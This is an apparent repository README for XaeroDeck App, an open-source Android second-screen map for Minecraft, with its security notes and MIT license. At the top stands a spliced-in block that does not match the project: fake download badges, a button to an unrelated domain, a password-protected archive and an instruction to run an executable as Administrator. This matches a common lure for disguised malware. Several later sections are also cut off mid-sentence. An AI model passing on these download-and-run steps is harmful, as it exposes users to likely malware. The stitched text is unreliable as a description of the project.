<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

# 📟 XaeroDeck App

**A tactical second screen for Minecraft.** Native Android companion for the
## The map

- **Live streaming** — your position at up to 20 Hz over SSE, and map tiles
  that update within moments of terrain rendering in-game (the mod pushes
  "region changed" events; the app refetches only what changed).
- **Three-level zoom pyramid** — full-detail 512-block region tiles up close,
  2048-block overviews mid-zoom, 4096-block super-tiles when you pull way out.
  Zoom from individual blocks to a continent without the map flashing or the
  device running out of memory.
- **Fling inertia** — flick to glide across the map; friction scales with zoom
  so a flick covers a sane distance whether you're at block level or 100k out.
- **Dimension switcher** — LIVE follows your player; Overworld / Nether / End
  browse any dimension's cache (nether pulled from Xaero's cave-layer caches).
- **Entity radar** — players (distinct color), Meteor **friends** (green),
  hostiles/neutrals/passives in Xaero's minimap colors, angered neutrals shown
  hostile. Travel **trail history** persists across sessions.
- **Waypoints** — rendered live from Xaero's minimap set, list auto-sized to
  the longest name, each row showing its **nether/overworld twin coords**.
  Tap a waypoint to jump to it; long-press the map to create one (name, Y,
  all 16 Xaero colors); long-press a list entry to delete.
- **Live ETA** — navigating anywhere shows a time-to-arrive chip computed
  from your real (smoothed) speed, re-estimated every stream frame: straight
  shots, full remaining route length for multi-leg routes and spirals, lap
  time for orbits — plus a **via-nether time** on long overworld hauls.
- **Position readout** — both dimensions at once (`N:` and `O:` lines),
  comma-separated numbers, current dimension in green.
- **Sighting log** — every player the radar passes is journaled per server
  with coords, dimension, and age; friends green, everyone else red, names
  rendered in their Minecraft colors (bot walls of §-code names collapse
  into one entry). Tap a sighting to jump the map there.
- **Stats bar** — speed (bps), ping, server TPS, HP, totem count, elytra
  durability %, and active potion effects with live countdowns.

## Controls reference

Full-word buttons down the **left rail**, compass inset on the right, sized
for fat-finger use while flying.

| Button | Tap | Long-press |
|---|---|---|
| **NAVIGATE** | Cycle OFF → WALK (Baritone) → FLY (autopilot). In a nav mode, tap map/waypoint to go; long-press map to cancel | — |
| **ROUTE** | Open the route editor (below) | — |
| **MARKERS** | Toggle seed structure markers | Filter dialog — toggle each structure type individually |
| **ERA** | Toggle the worldgen-era / modified-terrain overlay | — |
| **CHAT** | Chat window (opens scrolled to newest; **pinch to resize text**) | — |
| **MODULES** | Meteor module browser: toggle any module, edit its settings inline (switches, real-bounds sliders, dropdowns) | — |
| **METEOR** | Quick panel of favorite module toggles | — |
| **CONFIG** | Server address, token, watchdog, alert sound, oracle seed, structure version | — |
| **NAMES** | *(hold)* Shows the full structure name under every marker while pressed | — |

## Route editor — draw your flight

MS-Paint-style shape tools that hand routes to the mod's elytra autopilot
(steering-only; the mod manages Meteor ElytraFly for thrust — see the
## Seed overlays: ERA and MARKERS

When the mod knows the world seed (auto-captured from SeedcrackerX, from the
community seed DB, or typed into CONFIG → oracle seed):

- **ERA** tints chunks by which Minecraft version's worldgen produced them and
  paints **player-modified terrain red** — old-growth bases and stash holes
  light up.
- **MARKERS** draws chunkbase-style predicted structures with their actual
  Minecraft sprite icons: villages, bastions, fortresses, monuments,
  mansions, outposts, temples, shipwrecks, ruined portals, end cities,
  strongholds, the end gateway ring… Long-press MARKERS for the legend —
  every type with its icon, individual toggles, and an ALL MARKERS master
  switch. **Slime chunks** are computed on-device straight from the seed
  and overlay in green when zoomed in.
## Chat, notifications and watchdog

- **Minecraft color rendering everywhere** — chat and notifications render
  §-codes and RGB colors exactly like in-game.
- **Notification toasts** — big, top-center, streaming from the mod (Meteor
  notifier events, radar mods, seed captures, deaths).
- **Watchdog** 🚨 — pattern-watches your stats and fires a full-volume alert:
  **TOTEM POP** (totem count drops), **ELYTRA LOW** (durability under
  threshold), **HP LOW**, **PLAYER** (radar contact), and **CONNECTION
  LOST** (the stream dies while you're AFK — crash/kick alarm). Pick any
  system ringtone/alarm as the alert sound in CONFIG (with TEST ALERT
  button); silent mode supported. A grace period after joining a world
  prevents false alarms.
- **Death alert** — vibrates the device and pins your death coordinates.

## Offline mode

Every tile the app ever fetches is cached per-world on the device. No
connection? The world browser opens any previously-seen world for full
pan/zoom browsing — all dimensions, all zoom levels — from cache.

## Security

The app speaks **only** to the mod on your LAN: no analytics, no internet
permissions used beyond your local network, token sent only to the server you
paired with, and the discovery beacon never carries secrets. Threat model in
## Building

```bash
ANDROID_HOME=~/Android/Sdk ./gradlew assembleDebug
adb install -r app/build/outputs/apk/debug/app-debug.apk
```

Android SDK (compileSdk 35) + JDK 17+. Kotlin, Jetpack Compose Material3,
custom canvas map view. Release APKs are built by GitHub Actions from tagged
source, so you can verify what you sideload.

## License

MIT.


---

# Security

XaeroDeck App is a companion display for your own Minecraft client. It is built
for anarchy-server players, so it assumes a hostile world. Don't trust this
page — verify it; the whole app is open source and unobfuscated.

## What it talks to

Exactly one thing: the XaeroDeck mod's HTTP server on your own LAN (found via
its UDP broadcast beacon, or an address you type). There is no cloud relay, no
account system, no analytics, no crash reporting, no ads, no third-party SDKs,
and no update check. The dependency list is AndroidX + Kotlin coroutines —
nothing that phones home.

## What it sends

- HTTP requests to your mod's server: tile fetches, status stream, and — only
  when you use those features — waypoint edits, chat messages, Meteor/Baritone
  commands. Control requests carry your pairing token in a header.
- Nothing else, to anyone else, ever.

## What it stores (on-device only)

- Map tiles, travel trails, and waypoint snapshots per world, in the app's
  private storage — so your explored maps are browsable offline.
- Your pairing token and settings, in the app's private preferences.
- Nothing is synced or backed up anywhere by the app.

This means the tablet itself holds your base coordinates and map history.
Treat the device accordingly: lock screen on, and don't hand it to someone
you wouldn't show your stashes.

## Permissions, and why

| Permission | Why |
|---|---|
| `INTERNET` / `ACCESS_NETWORK_STATE` | Talking to your mod's LAN server |
| `ACCESS_WIFI_STATE` + `CHANGE_WIFI_MULTICAST_STATE` | Receiving the mod's UDP discovery beacon |
| `VIBRATE` | Death alerts |

No location, no contacts, no storage access outside the app's own sandbox.

## Verifiable builds

Release APKs (v0.2.2+) are built by GitHub Actions from the tagged source —
open the Build workflow run for any release and compare. Or build it yourself:
`./gradlew assembleDebug`.

Mod-side threat model (endpoints, token gating, opt-ins, "is this a RAT?"):
## Reporting

Found a hole? Open an issue or ping J_wsh. Security reports get fixed before
features.


---

MIT License

Copyright (c) 2026 JawshTheDark

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
